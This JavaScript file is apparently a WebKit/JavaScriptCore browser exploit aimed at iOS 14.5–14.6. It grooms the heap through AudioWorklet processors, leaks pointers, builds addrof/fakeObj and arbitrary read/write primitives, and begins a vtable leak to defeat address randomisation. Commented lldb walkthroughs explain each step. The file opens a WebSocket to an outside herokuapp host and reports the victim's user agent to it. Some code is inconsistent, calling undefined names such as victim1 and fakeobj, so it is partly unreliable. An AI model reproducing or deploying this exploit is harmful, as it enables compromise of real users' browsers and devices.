var socket = new WebSocket("wss://slug-detected.herokuapp.com/")

function sleep(sleepDuration) {
	var now = new Date().getTime();
	while (new Date().getTime() < now + sleepDuration) {
		/* do nothing */
	}
}

function gc() {
	for (let i = 0; i < 0x10; i++) {
		new ArrayBuffer(0x1000000);
	}
}

class OrigineWorklet extends AudioWorkletProcessor {
	constructor() {
		super();
		//var fuck2 = new AudioWorkletProcessor();
		return b;
	}
	static get parameterDescriptors() {
		return [];
	}
	process(inputs, outputs, parameters) {
		return false;
	}
}

class OrigineWorklet2 extends AudioWorkletProcessor {
	constructor() {
		super();
		//console.log(c);
		this.port.onmessage = (e) => {};

		fuck = this;
		//fuck.port.postMessage(c);
		return this;
	}
	static get parameterDescriptors() {
		return [
			{
				name: "param2",
				defaultValue: 0.1337,
			},
		];
	}
	process(inputs, outputs, parameters) {
		//
		//
		//this.port.postMessage(c);
		return false;
	}
}

function kickstart145() {
	socket.send(`{
		exploitVersion: "14.5",
		userAgent: ${navigator.userAgent},
	}`);
	let data_view = new DataView(new ArrayBuffer(8));
	var floatAsQword = (float) => {
		data_view.setFloat64(0, float, true);
		var low = data_view.getUint32(0, true);
		var high = data_view.getUint32(4, true);
		return low + high * 0x100000000;
	};

	var qwordAsTagged = (qword) => {
		return qwordAsFloat(qword - 0x02000000000000);
	};

	var qwordAsFloat = (qword) => {
		data_view.setUint32(0, qword % 0x100000000, true);
		data_view.setUint32(4, qword / 0x100000000, true);
		//data_view.setBigUint64(0, qword);
		return data_view.getFloat64(0, true);
	};

	function change_container(header, arr) {
		try {
		} catch {}
		for (var i = 0; i < 0x100000; i++) {
			ds[i].cellHeader = header;
			ds[i].butterfly = arr;
		}
	}

	const MY_OBJECT_OFFSET = 0x14fb0;
	//MakeJitCompiledFunction();
	//MakeJitCompiledFunction();

	var a = new Array(10);
	for (var i = 0; i < 0x1000; i++) a[i] = Array(0x40).fill(0.0);
	var b = Array(0x40).fill(0.0);
	var c = Array(0x40).fill(0.0);
	var ds = new Array(0x100000);

	let noCoW = 13.37;
	let pad = new Array(noCoW, 2.2, {}, 13.37);
	let pad1 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8, 8);
	let pad2 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8, 8);

	var evil_arr = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);

	var boxed = new Array(
		qwordAsTagged(0x41414141414141),
		noCoW,
		{},
		13.37,
		5.5,
		6.6,
		7.7,
		8,
		8
	);

	var unboxed = new Array(noCoW, 13.37, 13.37, 13.37, 5.5, 6.6, 7.7, 8, 8);
	var victim = [noCoW, 14.47, 15.57];
	victim.prop = 13.37;
	victim["prop_1"] = 13.37;
	let pad3 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8, 8);
	//var gcPreventer = [];
	var structure_id = 0;
	c[0] = 1.1;
	var fuck = undefined;
	var fuck2 = undefined;
	var driver = undefined;
	var stage = "leak";
	var jscell_header = undefined;
	var evil_arr_butterfly = undefined;
	var expected_ptr = undefined;
	eval(`
for(var i = 0; i < 0x10000; i++){
    var tag = qwordAsTagged(0x0108230700001000)
    ds[i] = {
        cellHeader1: tag,
        butterfly1: evil_arr,
        cellHeader2: tag,
        butterfly2: evil_arr,
        cellHeader3: tag,
        butterfly3: evil_arr
    };
}
`);

	b.process = (inputs, outputs, parameters) => {
		//sa
		if (stage == "leak") {
			var expected_ptr =
				(BigInt(floatAsQword(c[4])) & 0xfffffffffff00000n) - 0x100000n;
			expected_ptr = Number(expected_ptr);
			c[8] = qwordAsFloat(expected_ptr + 0x4010);
			c[9] = qwordAsFloat(0x0);
			stage = "bypass_etc";
			fuck.port.postMessage(c);
			//sleep(4000);
			return true;
		} else if (stage == "bypass_etc") {
			//fuck.port.postMessage(typeof parameters);
			var gcPreventer = [];
			for (let i = 0; i < 2; i++) {
				let a = i == 0 ? parameters : victim;
				gcPreventer.push(a[0]);
			}
			jscell_header = gcPreventer[0];

			var gcPreventer = [];
			for (let i = 0; i < 2; i++) {
				let a = i == 0 ? parameters : victim;
				gcPreventer.push(a[1]);
			}
			evil_arr_butterfly = floatAsQword(gcPreventer[0]);

			structure_id = floatAsQword(jscell_header) & 0xffffffff;
			if (structure_id == 0) {
				fuck.port.postMessage(`retry`);

				c[8] = qwordAsFloat(0);
				parameters = null;
				//sleep(10000000);
				//stage = "leak";
				return false;
			}
			fuck.port.postMessage(
				`jscell header : ${floatAsQword(jscell_header).toString(16)}`
			);

			//fuck.port.postMessage(`evil_arr_butterfly : ${evil_arr_butterfly.toString(16)}`);
			//return false;
			var cellHeader = jscell_header; //qwordAsTagged( (0x01082307 * 0x100000000) + structure_id);
			//change_container(cellHeader, evil_arr);
			c[8] = qwordAsFloat(evil_arr_butterfly);
			evil_arr[0] = cellHeader;
			evil_arr[1] = qwordAsFloat(evil_arr_butterfly - 0x8);

			stage = "r/w";
			return true;
		} else if (stage == "r/w") {
			for (var i = 0; i < 2; i++) {
				let a = i == 0 ? parameters : pad;
				a[0] = qwordAsFloat(0x133700001337);
			}
			fuck.port.postMessage(
				`evil_arr length : ${evil_arr.length.toString(16)}`
			);
			evil_arr[0] = qwordAsFloat(0x00010100 * 0x100000000 + structure_id);
			evil_arr[1] = qwordAsFloat(0);
			var boxed_offset = 0;
			for (var i = 0; i < evil_arr.length; i++) {
				if (evil_arr[i] == qwordAsFloat(0x0041414141414140)) {
					//fuck.port.postMessage(`boxed_arr length offset: ${(i).toString(16)}`);
					boxed_offset = i;
					break;
				}
			}
			var addrof = (obj) => {
				boxed[0] = obj;
				return floatAsQword(evil_arr[boxed_offset]);
			};
			var fakeObj = (addr) => {
				evil_arr[boxed_offset] = qwordAsFloat(addr);
				return boxed[0];
			};
			
			stage = "gc_test";
			return true;
		} else if (stage == "gc_test") {
			gc();
			fuck.port.postMessage("Garbage Collected");
			//sleep(100000);
			stage = "arbr/w"
			return true;
		} else if (stage == "arbr/w") {
			var print = (msg) => {
          fuck.port.postMessage(msg);
        }
        //print("unboxed @ " + new Int64(addrof(unboxed1)));
        //print("boxed @ " + new Int64(addrof(boxed1)));

    var container = { //here we are simply crafting a contianer to make it seem like a JSObject this will be our "JSCell" since all JSobjects
	//contain a JSCell to be a container for a header and a butterfly backing
	//all JSObjects have a header at offset 0 which store a structureID more on that later since we also have to defeat this mitagation
	//and a butterfly backing 
        header: qwordAsTagged(0x0108230900000000), //at offset 0 we have our header which tells JSC what type of object it is
	    //0x0108230700000000 tells JSC its an ArrayWithDoubles and 0x0108230900000000 tells JSC its an ArrayWithContigous
	    //contigous meaning it holds at least an object or an array with containing multiple values such as doubles,JSValues,Ints etc
	    //example var a = [13.37] will be ArrayWithDouble 0x0108230700000000
	    //example var a = [13.37,{}] or [{}] or [1.1,{},0x1234] all count as contigous 0x0108230900000000
	    //so here we are telling JSC our *Fake Object* is arraywithcotigous
        butterfly: victim1, // butterfly here we chose our victim or array from our structureID spray from earlier to be our butterfly backing
	    //for the soul purpose that victim1 has an inline property double value for r/w purposes
    };
	      //only legit float values can be read/written to
    //var unboxed = [13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37];
    //unboxed = 4.2; // Disable/undo CopyOnWrite (forced to make new Array which is ArrayWithDouble)
    //var boxed = [{}];

    print("container @ " + new Int64(addrof(container)));

    var hax = fakeobj(addrof(container) + 0x10); //hax will be our fakeobject which is just the victim1 arraywithdouble as a butterfly
	//if this works without crashing then we now have fakeobject "hax" that can now do arbitrary r/w
    print("we have hax object ;)");
    print("after further work we can use this object for arbitrary r/w");
    print("now lets steal a real JSCellHeader")
    // Can now simply read a legitimate JSCell header and use it.
	//also we are still not good and it prone to crash remember our cell header from earlier telling JSC we are ArrayWithCotigous well 
	//Webkit team added another mitagation to defeat just simply faking an object and then gaining r/w now it has to be a valid object or else
	//seem valid to avoid a crash; StructureID as a mitagation add bits to the CellHeader of any object that indicates its gc reference number if 
	//if its invalid that means the object is corrupted JSC eyes so either we have to A play by the rules and only use a real valid object or B a 
	//header then craft fake object race to not trigger gc() or JIT and steal a real cell header and make it our own 
	//Option A is feasible as we can't get arbitrary r/w that way so i guess B it is!
    //var js_header = hax[0]; not feasible anymore they added another factor to help with StructID mitagation by caching structureID list in 
    //JIT memory :(
    //container.header = js_header; 
    //print("Stolen Real Cell Header: " + hex1(floatAsQword(js_header)))
    
    // Can read/write to memory now by corrupting the butterfly
    // pointer of the float array.
    //hax[1] = 3.54484805889626e-310;    // 0x414141414141 in hex
    //victim1[0] = 1337;
	       container.header = jscell_header
//ok so simply stealing a header and using that isn't going to work as yes it'll pass gc test and wont crash but as soon as we trigger jit, jit will
	      //look into its cache and see that were fake and invalid and cause a crash
	      //so we can technically still steal a structureid or cell header but we also need to find a way to essentially clear the JIT Cache
	      //referencee https://googleprojectzero.blogspot.com/2020/09/jitsploitation-two.html
	      /*Running the current exploit would yield memory read/write, but would likely crash soon after 
	      when the garbage collector runs the next time and scans all reachable heap objects.
The general approach to achieve exploit stability is to keep all heap objects in a functioning state (one that will not cause the GC to crash when it 
scans the object and visits all outgoing pointers), or, if that is not possible, to repair them as soon as possible after corruption. 
In the case of this exploit, the fake_arr is initially “GC unsafe” as it contains an invalid StructureID. When its JSCell is later replaced with a 
valid one (container.jscell_header = jscell_header;) the faked object becomes “GC safe” as it appears like a valid JSArray to the GC.
However, there are some edge cases that can lead to corrupted data being stored in other places of the engine as well. For example, the array load 
in the previous JavaScript snippet (jscell_header = fake_arr[0];) will be performed by a get_by_val bytecode operation. This operation also keeps 
a cache of the last seen structure ID, which is used to build the value profiles relied on by the JIT compiler. This is problematic, as the 
structure ID of the faked JSArray is invalid and will thus lead to crashes, for example when the GC scans the bytecode caches. However, the fix is 
fortunately fairly easy: execute the same get_by_val op twice, the second time with a valid JSArray, whose StructureID will then be cached instead:
*/
	      //so according to projectzer0 we can clear the cache by performing get_by_val jit operation twice
    let results = [];
    for (let i = 0; i < 2; i++) { //trigger jit by performing same operation more than once
        let a = i == 0 ? hax : victim1; //perform logical get_by_val operation twice of 
	    //essentially in first loop itll grab our hax object because i will equal 0 so itll get hax object
	    //but the second time it will grab victim1 object essentially clearing the JITCache
        results.push(a[0]); //push the results to results array
    }
    var jscell_header = results[0]; //make jscell_header equal that of victim1
    print("Stolen Real Cell Header: " + new Int64.fromDouble(jscell_header))
//now we can set container to the real JSCellHeader so we wont ever crash :)

	      
      
    var stage2 = {
        addrof: function(obj) {
            return addrof(obj)
        },

        fakeobj: function(addr) {
            return fakeobj(addr)
        },

        write64: function(where, what) {
            hax[1] = qwordAsFloat(where + 0x10);
            victim.prop = qwordAsFloat(what);
        },
	
	writeInt64: function(where, what) {
            //set_victim_addr(where)
	    hax[1] = qwordAsFloat(where + 0x10);
            victim.prop = what.asDouble();
        },


        read64: function(where) {
            hax[1] = qwordAsFloat(where + 0x10);
            var res = floatAsQword(victim.prop);
            //hax[1] = reset;
            //victim1.prop = shared_butterfly;
            return res;
        },
        readInt64: function(where) {
            if (where instanceof Int64) {
                where = Add(where, 0x10);
		hax[1] = where.asDouble();
	    } else {
		hax[1] = qwordAsFloat(where + 0x10);
	    }
            //hax[1] = qwordAsFloat(where + 0x10); //(Add(where , new Int64("0x10"))).asDouble();
            var res = floatAsQword(victim.prop) //is this a double? //this.addrof(victim1.prop);
            //hax[1] = reset;
            //victim1.prop = shared_butterfly;
            return new Int64(res);
        },
        write(addr, data) {
            while (data.length % 4 != 0)
                data.push(0);

            var bytes = new Uint8Array(data);
            var ints = new Uint16Array(bytes.buffer);

            for (var i = 0; i < ints.length; i++)
                this.write64(Add(addr, 2 * i), ints[i]);
        },
        read(addr, length) {
	    //addr = new Int64(addr);
            var a = new Array(length);
            var i;
            var v;

            for (i = 0; i + 8 < length; i += 8) {
                v = new Int64(this.read64(addr + i)).bytes()
                for (var j = 0; j < 8; j++) {
                    a[i+j] = v[j];
                }
            }

            v = new Int64(this.read64(addr + i)).bytes()
            for (var j = i; j < length; j++) {
                a[j] = v[j - i];
            }

            return a

        },

        test: function() {
            var addr = this.addrof({a: 0x1337});
            var x = this.fakeobj(addr);
            port.postMessage(hex1(x.a))
            if (hex1(x.a) != 0x1337) {
                print('stage2 addrof/fakeobj does not work');
            }

            var val = 0x42424242;
            //this.write64(0x4141414141,0x999999999)
            //this.read64(0x999999)
            this.write64(shared_butterfly - 8, 0x42424242);
            print(hex1(floatAsQword(unboxed1[1])))
            if (qwordAsFloat(val) != unboxed1[1]) {
                print('stage2 write does not work');
            }

            if (this.read64(shared_butterfly + 8) != 0x42424242) {
                print('stage2 read does not work');
            }
        },

        clear: function() {
            outer = null;
            hax = null;
            for (var i = 0; i < unboxed_size; ++i)
                boxed1[i] = null;
            boxed1 = null
            unboxed1 = null
        },
    };
        print("we have arbitrary r/w with JSArray :)");
   	memory = stage2;
	print("~Turnerhackz1 shoutout to the best teacher ever for this vtable leak method :)");
	var a = {}
	//firstly we need to Calculate JSC::MarkedBlock::Footer or aka footer().vm()
	//JSC truncates everything to 32 bits so we need to truncate object address to a 32 bit address and do some math fucccckkkk
	//running lldb /System/Library/Frameworks/Versions/A/Helpers/jsc
	//then typing r to continue or run will yield us a JSC interpreter
	// if we run a = {} then run desrcibe(a) yields us this info 
	//>>> describe(a)
/*"Object: 0x12c4c0040 with butterfly 0x0(base=0xfffffffffffffff8) (Structure 0x12c429730:[0x2db8/11704, Object, (0/6, 0/0){}, NonArray, 
Proto:0x10a0253e8, Leaf]), StructureID: 11704"*/
	//as you can see our object addrss is 0x12c4c0040 lets perform math and 32 bit truncation on it 
	//BlockSize is iOS/macOS page size dependent for i6s and i7 and ipX i know its 0x4000 bytes large but anything after that is a guessing game
	//maybe can find out with p/x sizeof with lldb but havent tried it but i can confirm BlockSize in ios 12.1.4 i6s dyldsharedcache is 0x4000
	// p/x sizeof(JSC::MarkedBlock::Footer) yields 0x128 on debug builds but i think all devices are shipped with a release build version of webkit
	//0x128 seems to crash my idevices and my teacher told me that it for my device the offset is 0x130 so i tried that and it works so i guess
	// its 0x130 on releasebuilds or at least for ios 14.6
	// to calculate footer address aka JSC::MarkedBlock::Footer() 
	//footeraddr = "0x" + ((objaddr & 0xfffc0000) + (((bbaddr/0x100000000)|0)*0x100000000)+blocksize-footersize).toString(16);
	//on my device as describe our object address is 0x12c4c0040 which can be found with our addrof() primitives yielded this
	// footeraddr = "0x" + ((objaddr & 0xffffc000) + (((objaddr/0x100000000)|0)*0x100000000) + blockSize - footerSize).toString(16)
	//"0x12c4c3ed0"
	//pressing control c to exit jsc and back to lldb we can confirm this with lldb memory reads
	//our footeraddr should contains a segments of a bunch of zeroes that address contains our vm struct lets find out 
	/* (lldb) x/10gx 0x12c4c3ed0
0x12c4c3ed0: 0x0000000109004840 0x000000012c000000
0x12c4c3ee0: 0x000000012c003998 0xff1fff1f00000000
0x12c4c3ef0: 0x0000000000000000 0x0000000000000000
0x12c4c3f00: 0x0000000000000000 0x0000000000000000
0x12c4c3f10: 0x0000000000000000 0x0000000000000000
(lldb) # our vm struct is +0x8 from footeaddr 0x000000012c000000 
*/ 
	//as you can see our vmstruct on macos 12.3.1 jsc binary is at +0x8 this might be a different offset depending on device and version
	//0x000000012c000000 contains a whole bunch of zeroes so its definitely correct so lets read on this address
	/*(lldb) x/10gx 0x000000012c000000
0x12c000000: 0x0000000100000002 0x00000001090200c0
0x12c000010: 0x000000010900c100 0x00000000b1f15d16
0x12c000020: 0x5d26f673be00a5e3 0x6df5eb3d70828542
0x12c000030: 0xc000001c00000500 0x0000000000000000
0x12c000040: 0x0000000000000000 0x0000000000000001
*/ 
	//according to https://github.com/WebKit/WebKit/blob/releases/Apple/Safari-14.1.1-iOS-14.6/Source/JavaScriptCore/runtime/VM.h 
	//starting at line 337 we have 
	/*private:
    unsigned nextID(); skip 0x0 - 8
    static Atomic<unsigned> s_numberOfIDs; skip 0x8 - 0x10
    unsigned m_id; 0x0 - 0x8
    RefPtr<JSLock> m_apiLock; 0x8 - 0x10
    Ref<WTF::RunLoop> m_runLoop; 0x10 - 0x18 this is the address we want! to verify we can see that our address is followed by a bunch of random numbers
    if so then we have the right address lets look at it again
    WeakRandom m_random; 0x18 - 0x20 
    Integrity::Random m_integrityRandom; 0x20 - 0x30
*/
	/*(lldb) x/10gx 0x000000012c000000
0x12c000000: 0x0000000100000002 0x00000001090200c0 this is 0x0 - 0x8 then 0x8 - 0x10
0x12c000010: 0x000000010900c100 0x00000000b1f15d16 this is 0x10 - 0x18 then 0x18 - 0x20 0x18 -0x20 is m_random which is also random number :)
0x12c000020: 0x5d26f673be00a5e3 0x6df5eb3d70828542 this is 0x20 - 0x28 then 0x28 - 0x30 random numbers like i said :))))))
0x12c000030: 0xc000001c00000500 0x0000000000000000 so 0x10900c100 is our Ref<WTF::RunLoop> m_runLoop which is what we want:)
0x12c000040: 0x0000000000000000 0x0000000000000001*/
	//in the dyld shared cache there is a vtable for WTF::RunLoop hence why we want it so bad 
	//with an actual vtable leak you can use it to redirect control flow by overwriting it and calling a function of a vtable 
	// but there is no user callable vtable function that we can use so why are we so interested your wondering? because any vtable leak
	//leads to finding the base of said section it falls in which in this case its the __Data segment of JSC
	//                     __ZTVN3WTF7RunLoopE:        // vtable for WTF::RunLoop in a disassembler this is our vtable
	//so lets look into our m_runLoop to see what we have with lldb
	/*(lldb) x/10gx 0x000000010900c100
0x10900c100: 0x00708001e9ab0b10 0x0000000000000004 // offset 0x0 - 0x8 contains something interesting ;) its a signed vtable everything following is useless
0x10900c110: 0x0000000000000000 0x0000000000000000
0x10900c120: 0x0000000000000000 0x0000000000000000
0x10900c130: 0x0000000000000000 0x0000000000000000
0x10900c140: 0x0000000000000000 0x0000000000000000
*/
	//so as you can see m_runLoop contains a signed vtable address at offset 0 of the class which is expected in C++
	//every class whether public: or private: contains a vfptr or vptr at offset 0 which points to the vtable :)
	//as stated JSC does truncate everything down to 32 bits hence why the 48 bits and up is useless this is a 16 number hex address
	//each 4 numbers represents 16 bits, 16 x 4 sets of numbers = 64 bits so this address is 64 bits long so the upper 7 numbers are 28 bits
	//are completely useless so removing that we get 0x1e9ab0b10 which a 32 bit value. lets look into it:)
	
	/*(lldb) x/10gx 0x1e9ab0b10
0x1e9ab0b10: 0x49588001a8005788 0xbf058001a800578c
0x1e9ab0b20: 0xe5390001a80047bc 0x0000000000000000
0x1e9ab0b30: 0x0000000000000000 0x00748001a8005b44
0x1e9ab0b40: 0x8e508001a8005b48 0xfd5300018e9684c0
0x1e9ab0b50: 0x0000000000000000 0x0000000000000000
*/
	//dont know what this is but it looks like function prologues addresses represented by 64 bit which definitely looks correct :)
	//we can make it print 9 by two methods such as '0x'+0x00708001e9ab0b10.toString(16).slice(5) or 
	//truncate = (hexString) => '0x0000000' + hexString.slice(9);
	//truncate('0x00708001e9ab0b10');
	//lets give ios 14.6 a try at this same method shall we
	var objaddr = stage2.addrof(a);
	print("objaddr" + hex1(objaddr))
	var footeraddr = ((objaddr & 0xfffc0000) + (((objaddr/0x100000000)|0)*0x100000000)+0x4000-0x130);
	//refer to VM.h this is
        //JSC::MarkedBlock::footer at offset 8 should be the vm struct
	print("footeraddr @ " + footeraddr);
	var vmstruct = memory.read64(footeraddr+0x8);
	print("vmstruct @ " + hex1(vmstruct));
	//var m_runloop = memory.read64(vmstruct+0x10);
	//print("m_runloop @ " + hex1(m_runloop));
	//at offset 0 of m_runloop should be a vtable  :) should sit within the shared cache
        //var vtable = stage2.read64(m_runloop);
        //print("vtable @ " + hex1(vtable));
		}
		//  sleep(2000);
		return true;
	};
	registerProcessor("OrigineWorklet", OrigineWorklet);
	registerProcessor("OrigineWorklet2", OrigineWorklet2);
}
